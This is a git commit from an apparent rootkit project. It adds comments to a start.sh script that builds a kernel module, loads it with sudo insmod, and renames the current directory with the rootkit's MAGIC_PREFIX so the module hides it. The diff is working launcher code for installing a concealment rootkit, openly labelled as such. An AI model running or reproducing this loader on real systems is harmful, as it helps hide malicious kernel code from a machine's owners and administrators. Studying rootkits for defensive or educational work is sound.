6babe73759f7a2589f4fa2540107dcd77c19ab79
Cahleeb <calebchristopherparks@gmail.com>
2023-04-13 01:46:20 -0400

    Commented start.sh

--- start.sh
+++ start.sh
@@ -5,11 +5,17 @@ make
 koFile=$(ls *.ko)
 hFile=$(ls *.h)
 if test -f "$koFile"; then
+    
+    # Load the rootkit's kernel module:
     sudo insmod "$koFile"
+
+    # Hide current directory via MAGIC_PREFIX:
     magicPrefix=$(awk '/MAGIC_PREFIX/{print $3}' "$hFile" | tr -d '"')
     thisDirPath=$(pwd)
     thisDir=${PWD##*/}
     mv "$thisDirPath" '../'"$magicPrefix""$thisDir"
+
+    # Others:
 
     echo "built."
 fi
